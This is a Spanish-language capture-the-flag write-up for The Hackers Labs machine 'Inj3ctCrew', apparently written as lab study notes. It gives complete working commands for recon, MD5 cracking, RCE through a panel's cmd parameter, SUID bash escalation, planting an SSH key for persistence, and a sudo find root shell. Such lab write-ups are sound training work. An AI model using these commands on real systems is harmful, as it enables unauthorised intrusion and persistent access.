# Write-Up: Inj3ctCrew - The Hackers Labs

## Información General

- **Nombre de la máquina**: Inj3ctCrew
- **Plataforma**: The Hackers Labs
- **Dificultad**: Intermedio
- **Sistema Operativo**: Linux (Ubuntu 24.04.3 LTS)
- **IP objetivo**: 192.168.231.163
- **Fecha de resolución**: Julio 2026
- **Objetivos**: Obtención de la Flag de usuario y de root

---

## FASE 1: ENUMERACIÓN

### Descubrimiento de Hosts

```bash
sudo netdiscover -r 192.168.231.0/24
```

**Resultado:** Máquina objetivo localizada en 192.168.231.163

---

### Descubrimiento de Puertos

```bash
nmap -sCV -p- 192.168.231.163 -Pn -vvv -oA Inj3ctCrew
```

**Resultado:**

| Puerto | Estado | Servicio | Versión |
|--------|--------|----------|---------|
| 22/tcp | Open | SSH | OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 |
| 80/tcp | Open | HTTP | Apache httpd 2.4.58 (Ubuntu) |

**Análisis:**
- Puerto 22: SSH — acceso remoto potencial
- Puerto 80: Servidor web Apache — punto de entrada principal
- Título web: "Sigue Buscando" → pista clara de contenido oculto

---

## FASE 2: ENUMERACIÓN WEB

### Fuzzing de Directorios

```bash
gobuster dir -u http://192.168.231.163/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,zip,bak -t 40
```

**Resultado:**

| Archivo | Status | Tamaño |
|---------|--------|--------|
| backup.php | 200 | 937 |
| index.html | 200 | 1284 |
| login.php | 200 | 1311 |
| javascript/ | 301 | 323 |

---

### Análisis de backup.php

```bash
curl -s http://192.168.231.163/backup.php
```

**Hallazgo clave:** Comentario HTML con pista:
```html
<!-- Nosotros Inj3ctCrew, te hemos dejado una informacion importante en el directorio PwnedCredentials.html -->
```

**Base64 en comentario:**
```bash
echo "RWwgZGlyZWN0b3JpbyBkZSByZXNwYWxkbyBmdWUgY8y1zZvNisyQzJjMpsyYb8y1zYbNnc2EzZbNk8yYbcy0zJXNkMy/zZPMq82JcMy0zJrNhM2azYlyzLjNmM2EzL/Mocy6b8y4zaDNhM2bzYnMusyibcy1zZvNhs2GzZTNls2NZcy1zZjNoM2gzZTNmcyYdMy1zL/Nnc2AzZrMocyhacy1zaDNkcygzKZkzLXNnc2QzJrMos2UzJlvzLjMkM2EzYDNlsygzKY=" | base64 -d
```
**Decodificado:** "El directorio de respaldo fue comprometido — acceso no autorizado detectado."

---

### Análisis de PwnedCredentials.html

```bash
curl -s http://192.168.231.163/PwnedCredentials.html
```

**Credenciales expuestas:**
- **Usuario:** Admin
- **Contraseña (MD5):** d8578edf8458ce06fbc5bb76a58c5ca4

---

## FASE 3: CRACKING DE HASH

### Identificación y Cracking

```bash
echo "d8578edf8458ce06fbc5bb76a58c5ca4" > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 hash.txt
john --show --format=Raw-MD5 hash.txt
```

**Resultado:** `qwerty` (crackeado instantáneamente)

**Análisis:** Hash MD5 sin sal, contraseña extremadamente débil en rockyou.txt.

---

## FASE 4: ACCESO AL PANEL ADMINISTRATIVO

### Login en login.php

```bash
curl -c cookies.txt -X POST -d "user=Admin&pass=qwerty" http://192.168.231.163/login.php -v
```

**Resultado:** HTTP 302 Found → Redirect a `P4n3l.php` con cookie `PHPSESSID`

---

### Panel de Control (P4n3l.php) — RCE

```bash
curl -b cookies.txt http://192.168.231.163/P4n3l.php
```

**Hallazgo:** Formulario con input `cmd` que ejecuta comandos via GET.

**Prueba de RCE:**
```bash
curl -b cookies.txt "http://192.168.231.163/P4n3l.php?cmd=id"
```

**Resultado:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**¡RCE CONFIRMADO!** Ejecución de comandos como `www-data`.

---

## FASE 5: ENUMERACIÓN INTERNA (COMO WWW-DATA)

### Usuarios del Sistema

```bash
curl -b cookies.txt "http://192.168.231.163/P4n3l.php?cmd=cat+/etc/passwd"
```

**Usuario interesante:**
```
nolen11:x:1000:1000:nolen11:/home/nolen11:/bin/bash
```

---

### Búsqueda de Binarios SUID

```bash
curl -b cookies.txt "http://192.168.231.163/P4n3l.php?cmd=find+/+-perm+-4000+-type+f+2>/dev/null"
```

**Resultado:** Entre la salida estándar, se encuentra:
```
/system_updates/Updates/.scripts/.system_bash
```

**Análisis:** Bash compilado estáticamente con bit SUID, owner `nolen11`.

---

## FASE 6: ESCALADA A NOLEN11 (VIA SUID BASH)

### Verificación del Binario

```bash
curl -b cookies.txt "http://192.168.231.163/P4n3l.php?cmd=ls+-la+/system_updates/Updates/.scripts/.system_bash"
```

**Resultado:** `-rwsr-xr-x 1 nolen11 nolen11 ... .system_bash` → SUID + owner nolen11.

---

### Explotación

```bash
curl -b cookies.txt "http://192.168.231.163/P4n3l.php?cmd=/system_updates/Updates/.scripts/.system_bash+-p+-c+'id'"
```

**Resultado:**
```
uid=33(www-data) gid=33(www-data) euid=1000(nolen11) groups=33(www-data)
```

**¡ESCALADA A NOLEN11 CONFIRMADA!** `euid=1000(nolen11)`

---

### Lectura de User Flag

```bash
curl -b cookies.txt "http://192.168.231.163/P4n3l.php?cmd=/system_updates/Updates/.scripts/.system_bash+-p+-c+'cat+/home/nolen11/user.txt'"
```

**Flag de usuario obtenida.**

---

### Persistencia SSH

```bash
# En Kali
ssh-keygen -t rsa -b 2048 -f /tmp/nolen11_key -N ""

# Via SUID bash
curl -b cookies.txt -G "http://192.168.231.163/P4n3l.php" --data-urlencode "cmd=/system_updates/Updates/.scripts/.system_bash -p -c 'mkdir -p /home/nolen11/.ssh && echo \"$(cat /tmp/nolen11_key.pub)\" > /home/nolen11/.ssh/authorized_keys && chmod 700 /home/nolen11/.ssh && chmod 600 /home/nolen11/.ssh/authorized_keys && chown -R nolen11:nolen11 /home/nolen11/.ssh'"
```

---

### Acceso SSH como nolen11

```bash
ssh -i /tmp/nolen11_key nolen11@192.168.231.163
```

**Shell interactiva como nolen11 conseguida.**

---

## FASE 7: ESCALADA A ROOT (VIA SUDO FIND)

### Verificación de Sudo

```bash
sudo -l
```

**Resultado:**
```
User nolen11 may run the following commands on TheHackersLabs-Inj3ctCrew:
 (ALL) NOPASSWD: /usr/bin/find
```

---

### Explotación GTFOBin (find)

```bash
sudo find . -exec /bin/sh \; -quit
```

**Resultado:** Shell root (`uid=0(root)`)

---

### Lectura de Root Flag

```bash
cat /root/root.txt
```

**Flag de root obtenida.**

---

## CADENA DE EXPLOTACIÓN COMPLETA

```
LFI/Info Leak (backup.php) → Credenciales (PwnedCredentials.html)
 → Crack MD5 (qwerty) → Login Panel (Admin/qwerty)
 → RCE (P4n3l.php?cmd=) → www-data
 → Enum SUID → /system_updates/Updates/.scripts/.system_bash (bash SUID, owner nolen11)
 → .system_bash -p → euid=nolen11
 → SSH como nolen11 (persistencia)
 → sudo -l → (ALL) NOPASSWD: /usr/bin/find
 → GTFOBin find → Root
```

| Paso | Técnica | Detalle |
|------|---------|---------|
| 1 | Recon | netdiscover + nmap → puertos 22, 80 |
| 2 | Web Enum | gobuster → backup.php, login.php, PwnedCredentials.html |
| 3 | Info Leak | backup.php → PwnedCredentials.html → Admin:MD5 |
| 4 | Cracking | john + rockyou → qwerty |
| 5 | Login Panel | POST /login.php → Cookie PHPSESSID → P4n3l.php |
| 6 | RCE | P4n3l.php?cmd= → www-data |
| 7 | Enum Interna | /etc/passwd → nolen11 (UID 1000) |
| 8 | SUID Hunt | find / -perm -4000 → .system_bash (bash SUID, owner nolen11) |
| 9 | Escalada nolen11 | .system_bash -p → euid=nolen11 → user flag + SSH key |
| 10 | SSH nolen11 | ssh -i key nolen11@IP → shell interactiva |
| 11 | Sudo | sudo -l → find NOPASSWD |
| 12 | Root | sudo find . -exec /bin/sh \; -quit → root flag |

---

## FLAGS OBTENIDAS

| Flag | Valor |
|------|-------|
| **user.txt (nolen11)** | `[FLAG_USER]` |
| **root.txt** | `[FLAG_ROOT]` |

---

## ERRORES Y PROBLEMAS ENCONTRADOS

### Error 1: Búsqueda SUID incompleta
- **Problema:** `find / -perm -4000` devolvió muchos resultados estándar, pudo truncar o no mostrar el binario personalizado en ruta profunda (`/system_updates/...`)
- **Causa:** Salida grande, filtro mental ineficaz
- **Solución:** Filtrar excluyendo binarios conocidos: `find / -perm -4000 -type f 2>/dev/null | grep -vE '(su|sudo|passwd|mount|ch|umount|ping|fusermount)'`

### Error 2: Interpretación literal de "sistema se actualiza antes de arrancar"
- **Problema:** Enfocamos solo en initramfs
- **Causa:** La frase es ambigua — puede ser GRUB, systemd, APT hooks, /boot, kernel parameters
- **Solución:** Ampliar búsqueda a `/boot/grub/grub.cfg`, `/etc/apt/apt.conf.d/`, `/etc/kernel/postinst.d/`, `/etc/initramfs-tools/conf.d/`

### Error 3: No revisar rutas "extrañas" como `/system_updates/`
- **Problema:** Asumimos FHS estándar (/usr, /opt, /home)
- **Causa:** Máquinas CTF a menudo usan rutas personalizadas
- **Solución:** `find / -type d -name \"*update*\" -o -name \"*script*\" 2>/dev/null` para descubrir directorios no estándar

### Error 4: No verificar permisos en /home/nolen11
- **Problema:** `ls -la /home/nolen11` dio "Permission denied" como www-data
- **Causa:** Permisos 750 o 700
- **Solución:** Necesitamos escalar a nolen11 primero para enumerar su home

---

## HERRAMIENTAS UTILIZADAS

| Herramienta | Propósito |
|-------------|-----------|
| netdiscover | Descubrimiento ARP |
| nmap | Escaneo puertos/servicios |
| gobuster | Fuzzing directorios web |
| curl | Interacción HTTP, RCE, enumeración |
| john | Cracking hash MD5 |
| base64 | Decodificación pistas |
| ssh-keygen / ssh | Persistencia y acceso interactivo |
| GTFOBins (find, bash) | Escalada de privilegios |

---

## LECCIONES APRENDIDAS

1. **Los comentarios HTML y Base64 son oro** — siempre revisar fuente completa
2. **MD5 sin sal = trivial** — rockyou rompe qwerty en milisegundos
3. **RCE en panel admin = game over para www-data** — buscar escalada inmediata
4. **Pistas textuales ("antes de arrancar") son literales pero ambiguas** — pensar en: initramfs, GRUB, systemd, kernel cmdline, APT hooks
5. **Buscar SUID requiere filtrado agresivo** — binarios estándar ocultan los personalizados
6. **Rutas no estándar (/system_updates/) existen** — `find / -type d -name \"*update*\"` obligatorio
7. **www-data no ve /home/user** — escalada necesaria antes de enumerar home
8. **GTFOBins es biblia** — `find`, `bash`, `vim`, `awk`, `man` → root instantáneo si están en sudo NOPASSWD

---

## COMANDOS CLAVE UTILIZADOS

```bash
# Reconocimiento
nmap -sS -sV -sC -p- -Pn 192.168.231.163
gobuster dir -u http://192.168.231.163/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,js

# Credenciales
curl http://192.168.231.163/PwnedCredentials.html
echo "d8578edf8458ce06fbc5bb76a58c5ca4" | john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 --stdin

# RCE Panel
curl -c /tmp/cookies.txt -X POST -d "user=Admin&pass=qwerty" http://192.168.231.163/login.php
curl -b /tmp/cookies.txt "http://192.168.231.163/P4n3l.php?cmd=id"

# Enumeración SUID
curl -b /tmp/cookies.txt "http://192.168.231.163/P4n3l.php?cmd=find+/+-perm+-4000+-type+f+2>/dev/null"

# Escalada nolen11 (SUID bash)
curl -b /tmp/cookies.txt "http://192.168.231.163/P4n3l.php?cmd=/system_updates/Updates/.scripts/.system_bash+-p+-c+'id'"
curl -b /tmp/cookies.txt "http://192.168.231.163/P4n3l.php?cmd=/system_updates/Updates/.scripts/.system_bash+-p+-c+'cat+/home/nolen11/user.txt'"

# Persistencia SSH
ssh-keygen -t rsa -b 2048 -f /tmp/nolen11_key -N ""
curl -b /tmp/cookies.txt -G "http://192.168.231.163/P4n3l.php" --data-urlencode "cmd=/system_updates/Updates/.scripts/.system_bash -p -c 'mkdir -p /home/nolen11/.ssh && echo \"PUBKEY\" > /home/nolen11/.ssh/authorized_keys && chmod 700 /home/nolen11/.ssh && chmod 600 /home/nolen11/.ssh/authorized_keys && chown -R nolen11:nolen11 /home/nolen11/.ssh'"

# Acceso SSH
ssh -i /tmp/nolen11_key nolen11@192.168.231.163

# Escalada Root (GTFOBin find)
sudo -l
sudo find . -exec /bin/sh \; -quit
cat /root/root.txt
```

---

## EVIDENCIAS DE COMPROMISO

```
┌────────────────────────────────────────────────────────────┐
│ FLAGS OBTENIDAS │
├────────────────────────────────────────────────────────────┤
│ USER (nolen11): [FLAG_USER] │
│ ROOT: [FLAG_ROOT] │
└────────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────────┐
│ ACCESOS LOGRADOS │
├────────────────────────────────────────────────────────────┤
│ ✓ Web Panel (Admin/qwerty) → RCE como www-data │
│ ✓ SUID Bash → Escalada efectiva a nolen11 (euid=1000) │
│ ✓ SSH como nolen11 (clave RSA 2048) │
│ ✓ Sudo NOPASSWD find → GTFOBin → Root (uid=0) │
└────────────────────────────────────────────────────────────┘
```

---

## REFERENCIAS

- [GTFOBins - find](https://gtfobins.github.io/gtfobins/find/)
- [GTFOBins - bash](https://gtfobins.github.io/gtfobins/bash/)
- [HackTricks - Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)

---

*Write-up completado — Explotación verificada end-to-end*


---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../informes/Informe_Inj3ctCrew.md|Informe_Inj3ctCrew]] — GoBuster, Netcat / Reverse Shells, Post-Explotación
- [[../Apuntes/02 - Sistemas Operativos/Linux - Comandos Avanzados de Pentesting.md|Linux - Comandos Avanzados de Pentesting]] — GoBuster, Netcat / Reverse Shells, Post-Explotación
- [[../Apuntes/08 - Metodologías/Metodología - Explotación Linux.md|Metodología - Explotación Linux]] — Netcat / Reverse Shells, Post-Explotación, Reverse Shells
- [[../apuntes Joselu/MODULO3/resumen_master_clase43.md|resumen_master_clase43]] — GoBuster, Netcat / Reverse Shells, Post-Explotación
- [[../apuntes evolve/BLOQUE 6.md|BLOQUE 6]] — Netcat / Reverse Shells, Post-Explotación, Reverse Shells
- [[../apuntes Andres/08.07.2026 Path Traversal, LFI y Escalada - Máquina Banco.md|08.07.2026 Path Traversal, LFI y Escalada - Máquina Banco]] — Linux, Netcat / Reverse Shells, Post-Explotación

### 🛠️ Herramientas

- [[comandos/FFUF|FFUF]]
- [[comandos/GoBuster|GoBuster]]
- [[comandos/Metasploit|Netcat / Reverse Shells]]
- [[comandos/Nmap|Nmap]]
- [[comandos/SSH|SSH]]

### 🎯 Vulnerabilidades Relacionadas

- [[Apuntes/06 - Explotacion y Post-Explotacion/Reverse Shells y Post-Explotación.md|Command Injection / RCE]]

> #command-injection #escalada-privilegios #ffuf #gobuster #linux #netcat #nmap #post-explotacion #redes #reverse-shell #ssh
